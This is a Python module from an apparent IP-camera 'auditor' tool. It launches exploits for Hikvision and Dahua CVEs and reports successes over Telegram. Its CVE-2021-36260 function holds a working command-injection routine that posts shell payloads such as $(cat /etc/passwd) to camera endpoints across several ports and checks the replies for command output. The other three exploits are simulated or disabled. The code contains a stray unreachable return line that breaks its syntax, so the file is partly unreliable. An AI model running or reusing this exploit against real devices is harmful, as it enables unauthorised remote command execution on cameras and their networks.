#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SmartCam Auditor - M√≥dulo de Lanzamiento de Exploits
Ejecuta exploits espec√≠ficos para vulnerabilidades CVE encontradas
"""

import time
import requests
import socket
import json
import os
from datetime import datetime
from typing import Dict, List, Optional, Any
import threading
from concurrent.futures import ThreadPoolExecutor

# Diccionario de exploits disponibles
EXPLOITS = {
    "CVE-2021-36260": {
        "descripcion": "Command injection en Hikvision sin autenticaci√≥n",
        "funcion": "exploit_hikvision_command_injection",
        "severidad": "CRITICAL",
        "tipo": "Remote Code Execution"
    },
    "CVE-2020-13847": {
        "descripcion": "Exposici√≥n de credenciales en Dahua",
        "funcion": "exploit_dahua_credential_exposure",
        "severidad": "MEDIUM", 
        "tipo": "Information Disclosure"
    },
    "CVE-2017-7921": {
        "descripcion": "Bypass de autenticaci√≥n Hikvision",
        "funcion": "exploit_hikvision_auth_bypass",
        "severidad": "CRITICAL",
        "tipo": "Authentication Bypass"
    },
    "CVE-2018-9995": {
        "descripcion": "Bypass de autenticaci√≥n Dahua",
        "funcion": "exploit_dahua_auth_bypass", 
        "severidad": "CRITICAL",
        "tipo": "Authentication Bypass"
    }
}

class ExploitLauncher:
    """
    Clase principal para lanzar exploits contra dispositivos vulnerables
    """
    
    def __init__(self, config_file="config/config.json"):
        self.config = self.load_config(config_file)
        self.timeout = self.config.get('exploit_timeout', 10)
        self.max_threads = self.config.get('exploit_max_threads', 5)
        self.safe_mode = self.config.get('exploit_safe_mode', True)
        self.log_exploits = self.config.get('log_exploits', True)
        
        # Inicializar logging
        self.exploit_log = []
        
        # Inicializar notificador Telegram si est√° disponible
        try:
            from .telegram_notifier import TelegramNotifier
            self.telegram = TelegramNotifier(config_file=config_file)
        except ImportError:
            self.telegram = None
    
    def load_config(self, config_file):
        """Carga configuraci√≥n del sistema"""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return {}
        except Exception as e:
            print(f"[ERROR] Error cargando configuraci√≥n de exploits: {e}")
            return {}
    
    def log_exploit_attempt(self, cve_id, ip, resultado, detalle=""):
        """Registra intento de exploit"""
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'cve': cve_id,
            'ip': ip,
            'resultado': resultado,
            'detalle': detalle
        }
        
        self.exploit_log.append(log_entry)
        
        if self.log_exploits:
            print(f"[EXPLOIT] {log_entry['timestamp']} - {cve_id} @ {ip} - {resultado}")
    
    def exploit_hikvision_command_injection(self, ip, port=80):
        """
        Exploit para CVE-2021-36260 - Command injection en Hikvision
        Implementaci√≥n mejorada con m√∫ltiples payloads y t√©cnicas de detecci√≥n
        """
        try:
            print(f"üí• Ejecutando exploit Hikvision Command Injection en {ip}:{port}...")
            
            if self.safe_mode:
                print(f"‚ö†Ô∏è MODO SEGURO: Simulando exploit (no se ejecutar√° c√≥digo real)")
                time.sleep(2)  # Simular tiempo de ejecuci√≥n
                
                # Simular verificaci√≥n de vulnerabilidad
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Vulnerabilidad confirmada - Command injection posible',
                    'comandos_disponibles': ['id', 'whoami', 'ls', 'ps'],
                    'acceso_obtenido': 'Acceso de administrador simulado',
                    'payload_usado': "<?xml version='1.0' encoding='UTF-8'?><language>$(id)</language>",
                    'endpoint': f"http://{ip}/SDK/webLanguage"
                }
                
                self.log_exploit_attempt("CVE-2021-36260", ip, "SIMULADO_EXITOSO", 
                                       "Command injection confirmado en modo seguro")
                return resultado
            else:
                # EXPLOIT REAL - Implementaci√≥n mejorada con m√∫ltiples t√©cnicas
                print(f"üö® MODO REAL: Ejecutando exploit real para CVE-2021-36260")
                
                import requests
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                
                # Endpoints vulnerables conocidos para CVE-2021-36260
                endpoints = [
                    "/SDK/webLanguage",
                    "/ISAPI/System/configurationData",
                    "/SDK/webLanguage?format=xml"
                ]
                
                # Payloads de command injection mejorados
                test_payloads = [
                    "<?xml version='1.0' encoding='UTF-8'?><language>$(id)</language>",
                    "<?xml version='1.0' encoding='UTF-8'?><language>`id`</language>", 
                    "<?xml version='1.0' encoding='UTF-8'?><language>$(whoami)</language>",
                    "<?xml version='1.0' encoding='UTF-8'?><language>$(cat /etc/passwd)</language>",
                    "<?xml version='1.0' encoding='UTF-8'?><language>$(ls -la /)</language>"
                ]
                
                # Probar diferentes puertos comunes
                ports_to_try = [port, 80, 8080, 443] if port != 80 else [80, 8080, 443, 8000]
                
                for test_port in ports_to_try:
                    for endpoint in endpoints:
                        for payload in test_payloads:
                            
                            # Construir URL con http y https
                            for protocol in ['http', 'https']:
                                url = f"{protocol}://{ip}:{test_port}{endpoint}"
                                
                                headers = {
                                    "Content-Type": "application/xml",
                                    "User-Agent": "SmartCam-Auditor/2.0",
                                    "Accept": "*/*",
                                    "Connection": "keep-alive"
                                }
                                
                                print(f"   üéØ Probando: {url}")
                                print(f"   üì§ Payload: {payload[:50]}...")
                                
                                try:
                                    resp = requests.post(
                                        url, 
                                        data=payload, 
                                        headers=headers, 
                                        timeout=self.timeout,
                                        verify=False,
                                        allow_redirects=True
                                    )
                                    
                                    if resp.status_code == 200:
                                        response_text = resp.text
                                        
                                        # Detectar ejecuci√≥n exitosa de comandos
                                        command_indicators = [
                                            'uid=', 'gid=', 'groups=',  # id command
                                            'root:', 'daemon:', 'bin:',  # /etc/passwd
                                            'total ', 'drwx', '-rw-',    # ls output
                                            'bin', 'etc', 'var', 'usr'   # directory listing
                                        ]
                                        
                                        if any(indicator in response_text for indicator in command_indicators):
                                            print(f"   ‚úÖ {ip} VULNERABLE - Command injection exitoso!")
                                            
                                            resultado = {
                                                'vulnerable': True,
                                                'exploit_exitoso': True,
                                                'detalle': f'Command injection exitoso - Endpoint: {endpoint}',
                                                'response_status': resp.status_code,
                                                'command_output': response_text[:1000],
                                                'payload_usado': payload,
                                                'endpoint': url,
                                                'puerto_vulnerable': test_port,
                                                'protocolo': protocol,
                                                'comando_detectado': self._detect_command_type(response_text),
                                                'acceso_obtenido': 'Ejecuci√≥n de comandos confirmada',
                                                'headers_response': dict(resp.headers)
                                            }
                                            
                                            self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_EXITOSO", 
                                                                   f"Command injection en {url}")
                                            
                                            # Notificar por Telegram si est√° disponible
                                            if self.telegram:
                                                message = f"üö® EXPLOIT EXITOSO!\n"
                                                message += f"CVE-2021-36260 en {ip}:{test_port}\n"
                                                message += f"Command injection confirmado\n"
                                                message += f"Endpoint: {endpoint}"
                                                self.telegram.enviar_alerta(message)
                                            
                                            return resultado
                                    
                                except requests.exceptions.Timeout:
                                    print(f"   ‚è∞ Timeout en {url}")
                                    continue
                                    
                                except requests.exceptions.ConnectionError:
                                    print(f"   üîå Error de conexi√≥n en {url}")
                                    continue
                                    
                                except Exception as e:
                                    print(f"   ‚ùå Error en {url}: {str(e)}")
                                    continue
                
                # Si llegamos aqu√≠, ning√∫n exploit funcion√≥
                print(f"   ‚ùå {ip} no vulnerable a CVE-2021-36260 o exploit fall√≥")
                
                resultado = {
                    'vulnerable': False,
                    'exploit_exitoso': False,
                    'detalle': 'No se pudo confirmar vulnerabilidad en ning√∫n endpoint',
                    'endpoints_probados': len(endpoints) * len(ports_to_try) * 2,
                    'payloads_probados': len(test_payloads)
                }
                
                self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_FALLIDO", 
                                       "No vulnerable o exploit fall√≥")
                return resultado
                
        except Exception as e:
            error_msg = f"Error inesperado: {str(e)}"
            print(f"   ‚ùå {error_msg}")
            self.log_exploit_attempt("CVE-2021-36260", ip, "ERROR", error_msg)
            return {'vulnerable': False, 'error': error_msg, 'exploit_exitoso': False}
    
    def _detect_command_type(self, response_text):
        """Detecta qu√© tipo de comando se ejecut√≥ basado en la respuesta"""
        if 'uid=' in response_text and 'gid=' in response_text:
            return 'id'
        elif 'root:' in response_text and ':0:0:' in response_text:
            return 'cat /etc/passwd'
        elif 'total ' in response_text or 'drwx' in response_text:
            return 'ls'
        elif len(response_text.strip()) > 0:
            return 'comando_desconocido'
        return 'sin_salida'
            return {'vulnerable': False, 'error': str(e), 'exploit_exitoso': False}
    
    def exploit_dahua_credential_exposure(self, ip, port=80):
        """
        Exploit para CVE-2020-13847 - Exposici√≥n de credenciales en Dahua
        SIMULADO - En un entorno real, esto intentar√≠a obtener credenciales
        """
        try:
            print(f"üí• Ejecutando exploit Dahua Credential Exposure en {ip}:{port}...")
            
            if self.safe_mode:
                print(f"‚ö†Ô∏è MODO SEGURO: Simulando exploit (no se obtendr√°n credenciales reales)")
                time.sleep(1.5)
                
                # Simular obtenci√≥n de credenciales
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Credenciales expuestas encontradas',
                    'credenciales_encontradas': [
                        {'usuario': 'admin', 'password': '[CENSURADO]'},
                        {'usuario': 'viewer', 'password': '[CENSURADO]'}
                    ],
                    'archivos_accesibles': ['/etc/passwd', '/etc/shadow', '/config/users.xml']
                }
                
                self.log_exploit_attempt("CVE-2020-13847", ip, "SIMULADO_EXITOSO",
                                       "Credenciales expuestas confirmadas en modo seguro")
                return resultado
            else:
                print(f"üö® MODO REAL: Exploit real deshabilitado por seguridad")
                self.log_exploit_attempt("CVE-2020-13847", ip, "REAL_DESHABILITADO",
                                       "Exploit real no implementado por seguridad")
                return {'vulnerable': False, 'motivo': 'Exploit real deshabilitado'}
                
        except Exception as e:
            self.log_exploit_attempt("CVE-2020-13847", ip, "ERROR", str(e))
            return {'vulnerable': False, 'error': str(e)}
    
    def exploit_hikvision_auth_bypass(self, ip, port=80):
        """
        Exploit para CVE-2017-7921 - Bypass de autenticaci√≥n Hikvision
        """
        try:
            print(f"üí• Ejecutando exploit Hikvision Auth Bypass en {ip}:{port}...")
            
            if self.safe_mode:
                time.sleep(1)
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Bypass de autenticaci√≥n confirmado',
                    'acceso_obtenido': 'Acceso administrativo sin credenciales'
                }
                self.log_exploit_attempt("CVE-2017-7921", ip, "SIMULADO_EXITOSO")
                return resultado
            else:
                self.log_exploit_attempt("CVE-2017-7921", ip, "REAL_DESHABILITADO")
                return {'vulnerable': False, 'motivo': 'Exploit real deshabilitado'}
                
        except Exception as e:
            self.log_exploit_attempt("CVE-2017-7921", ip, "ERROR", str(e))
            return {'vulnerable': False, 'error': str(e)}
    
    def exploit_dahua_auth_bypass(self, ip, port=80):
        """
        Exploit para CVE-2018-9995 - Bypass de autenticaci√≥n Dahua
        """
        try:
            print(f"üí• Ejecutando exploit Dahua Auth Bypass en {ip}:{port}...")
            
            if self.safe_mode:
                time.sleep(1)
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Bypass de autenticaci√≥n confirmado',
                    'acceso_obtenido': 'Acceso a interfaz web sin autenticaci√≥n'
                }
                self.log_exploit_attempt("CVE-2018-9995", ip, "SIMULADO_EXITOSO")
                return resultado
            else:
                self.log_exploit_attempt("CVE-2018-9995", ip, "REAL_DESHABILITADO")
                return {'vulnerable': False, 'motivo': 'Exploit real deshabilitado'}
                
        except Exception as e:
            self.log_exploit_attempt("CVE-2018-9995", ip, "ERROR", str(e))
            return {'vulnerable': False, 'error': str(e)}
    
    def lanzar_exploit_individual(self, cve_id, ip, puerto=80):
        """
        Lanza un exploit espec√≠fico contra un dispositivo
        
        Args:
            cve_id (str): ID del CVE (ej: CVE-2021-36260)
            ip (str): IP del dispositivo objetivo
            puerto (int): Puerto del servicio
            
        Returns:
            dict: Resultado del exploit
        """
        if cve_id not in EXPLOITS:
            return {
                'vulnerable': False,
                'error': f'Exploit no disponible para {cve_id}'
            }
        
        exploit_info = EXPLOITS[cve_id]
        funcion_exploit = exploit_info['funcion']
        
        print(f"\nüéØ Lanzando exploit: {cve_id}")
        print(f"üìç Objetivo: {ip}:{puerto}")
        print(f"üìã Descripci√≥n: {exploit_info['descripcion']}")
        print(f"‚ö†Ô∏è Severidad: {exploit_info['severidad']}")
        
        try:
            # Ejecutar la funci√≥n de exploit correspondiente
            resultado = getattr(self, funcion_exploit)(ip, puerto)
            
            # Notificar por Telegram si el exploit fue exitoso
            if (resultado.get('exploit_exitoso') and 
                self.telegram and self.telegram.is_enabled()):
                
                self.telegram.notify_exploit_success(cve_id, ip, exploit_info['descripcion'])
            
            return resultado
            
        except AttributeError:
            error_msg = f"Funci√≥n de exploit no implementada: {funcion_exploit}"
            self.log_exploit_attempt(cve_id, ip, "ERROR", error_msg)
            return {'vulnerable': False, 'error': error_msg}
        except Exception as e:
            error_msg = f"Error ejecutando exploit: {str(e)}"
            self.log_exploit_attempt(cve_id, ip, "ERROR", error_msg)
            return {'vulnerable': False, 'error': error_msg}
    
    def lanzar_exploits(self, cves_detectadas, ip_por_dispositivo):
        """
        Lanza exploits para todas las vulnerabilidades detectadas
        
        Args:
            cves_detectadas (list): Lista de CVEs detectados
            ip_por_dispositivo (dict): Mapeo de producto a IP
            
        Returns:
            list: Lista de resultados de exploits
        """
        print(f"\nüöÄ INICIANDO LANZAMIENTO DE EXPLOITS")
        print(f"=" * 60)
        print(f"üìä CVEs a explotar: {len([c for c in cves_detectadas if c.get('critico', False)])}")
        print(f"üéØ Dispositivos objetivo: {len(ip_por_dispositivo)}")
        print(f"‚ö†Ô∏è Modo seguro: {'ACTIVADO' if self.safe_mode else 'DESACTIVADO'}")
        print(f"=" * 60)
        
        resultados = []
        exploits_exitosos = 0
        exploits_fallidos = 0
        
        for cve in cves_detectadas:
            # Solo ejecutar exploits para CVEs cr√≠ticos por defecto
            if not cve.get("critico", False) and not self.config.get('exploit_all_cves', False):
                continue
            
            # Buscar IP del dispositivo
            producto = cve.get("producto", "")
            ip = None
            
            # Buscar IP por coincidencia de producto
            for dispositivo, device_ip in ip_por_dispositivo.items():
                if any(parte in dispositivo.lower() for parte in producto.lower().split()):
                    ip = device_ip
                    break
            
            if not ip:
                print(f"‚ö†Ô∏è No se encontr√≥ IP para {producto}")
                continue
            
            cve_id = cve.get("cve")
            
            # Verificar si hay exploit disponible
            if cve_id not in EXPLOITS:
                resultados.append({
                    'cve': cve_id,
                    'ip': ip,
                    'producto': producto,
                    'resultado': 'No disponible',
                    'detalle': f'Sin exploit para {cve_id}'
                })
                continue
            
            # Lanzar exploit
            resultado_exploit = self.lanzar_exploit_individual(cve_id, ip)
            
            # Procesar resultado
            if resultado_exploit.get('exploit_exitoso'):
                exploits_exitosos += 1
                estado = "EXITOSO"
                emoji = "‚úÖ"
            elif resultado_exploit.get('vulnerable') == False:
                exploits_fallidos += 1
                estado = "FALLIDO"
                emoji = "‚ùå"
            else:
                exploits_fallidos += 1
                estado = "ERROR"
                emoji = "‚ö†Ô∏è"
            
            resultado_final = {
                'cve': cve_id,
                'ip': ip,
                'producto': producto,
                'resultado': estado,
                'detalle': resultado_exploit.get('detalle', ''),
                'vulnerable': resultado_exploit.get('vulnerable', False),
                'error': resultado_exploit.get('error', ''),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            resultados.append(resultado_final)
            
            print(f"{emoji} [{cve_id}] {producto} en {ip} - {estado}")
            if resultado_exploit.get('detalle'):
                print(f"    üí¨ {resultado_exploit['detalle']}")
        
        # Resumen final
        print(f"\nüìä RESUMEN DE EXPLOITS")
        print(f"=" * 60)
        print(f"‚úÖ Exploits exitosos: {exploits_exitosos}")
        print(f"‚ùå Exploits fallidos: {exploits_fallidos}")
        print(f"üìã Total procesados: {len(resultados)}")
        
        # Generar reporte si est√° habilitado
        if self.log_exploits and resultados:
            self.generar_reporte_exploits(resultados)
        
        return resultados
    
    def generar_reporte_exploits(self, resultados):
        """Genera un reporte detallado de los exploits ejecutados"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            archivo_reporte = f"logs/exploit_report_{timestamp}.json"
            
            # Crear directorio si no existe
            os.makedirs("logs", exist_ok=True)
            
            reporte = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_exploits': len(resultados),
                'exitosos': len([r for r in resultados if r['resultado'] == 'EXITOSO']),
                'fallidos': len([r for r in resultados if r['resultado'] in ['FALLIDO', 'ERROR']]),
                'modo_seguro': self.safe_mode,
                'configuracion': {
                    'timeout': self.timeout,
                    'max_threads': self.max_threads
                },
                'resultados': resultados,
                'log_exploits': self.exploit_log
            }
            
            with open(archivo_reporte, 'w', encoding='utf-8') as f:
                json.dump(reporte, f, indent=2, ensure_ascii=False)
            
            print(f"üìÑ Reporte guardado: {archivo_reporte}")
            
        except Exception as e:
            print(f"‚ùå Error generando reporte: {e}")

# Funciones de compatibilidad y conveniencia
def lanzar_exploits(cves_detectadas, ip_por_dispositivo):
    """
    Funci√≥n de compatibilidad que mantiene la API original
    
    Args:
        cves_detectadas: resultado del m√≥dulo cve_checker
        ip_por_dispositivo: dict { "Hikvision DS-2CD2042FWD": "192.168.1.10", ... }
    
    Returns:
        list: Lista de resultados de exploits
    """
    launcher = ExploitLauncher()
    return launcher.lanzar_exploits(cves_detectadas, ip_por_dispositivo)

def lanzar_exploit_especifico(cve_id, ip, puerto=80):
    """
    Lanza un exploit espec√≠fico
    
    Args:
        cve_id (str): ID del CVE
        ip (str): IP del objetivo
        puerto (int): Puerto del servicio
    
    Returns:
        dict: Resultado del exploit
    """
    launcher = ExploitLauncher()
    return launcher.lanzar_exploit_individual(cve_id, ip, puerto)

def listar_exploits_disponibles():
    """
    Lista todos los exploits disponibles
    
    Returns:
        dict: Diccionario de exploits disponibles
    """
    return EXPLOITS.copy()

def verificar_exploit_disponible(cve_id):
    """
    Verifica si hay un exploit disponible para un CVE espec√≠fico
    
    Args:
        cve_id (str): ID del CVE
    
    Returns:
        bool: True si hay exploit disponible
    """
    return cve_id in EXPLOITS

if __name__ == "__main__":
    # Ejemplo de uso
    print("üöÄ SmartCam Auditor - M√≥dulo de Exploits")
    print("=" * 50)
    
    # Listar exploits disponibles
    print("üìã Exploits disponibles:")
    for cve_id, info in EXPLOITS.items():
        print(f"  ‚Ä¢ {cve_id}: {info['descripcion']} ({info['severidad']})")
    
    # Ejemplo de lanzamiento
    print(f"\nüß™ Ejemplo de uso:")
    launcher = ExploitLauncher()
    
    # CVEs simulados
    cves_ejemplo = [
        {
            "cve": "CVE-2021-36260",
            "producto": "Hikvision DS-2CD2042FWD",
            "descripcion": "Command injection",
            "critico": True
        }
    ]
    
    # IPs simuladas
    ips_ejemplo = {
        "Hikvision DS-2CD2042FWD": "192.168.1.100"
    }
    
    # Lanzar exploits
    resultados = launcher.lanzar_exploits(cves_ejemplo, ips_ejemplo)
    
    print(f"\n‚úÖ Ejemplo completado. Resultados: {len(resultados)}")
